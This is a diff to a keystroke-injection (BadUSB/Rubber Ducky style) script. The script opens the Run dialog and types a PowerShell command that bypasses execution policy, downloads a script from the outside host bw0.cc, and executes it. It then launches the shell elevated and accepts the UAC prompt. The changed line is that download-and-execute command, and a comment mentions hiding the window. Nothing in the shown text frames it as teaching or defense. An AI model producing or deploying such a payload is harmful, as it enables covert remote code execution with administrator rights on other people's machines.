@@ -10,7 +10,7 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -C $port = 8080;irm https://bw0.cc/lanss | iex
+STRING powershell -Ep Bypass -C $port = 8080; iex (irm bw0.cc/lanss)
 CTRL-SHIFT ENTER
 DELAY 2500
 ALT y
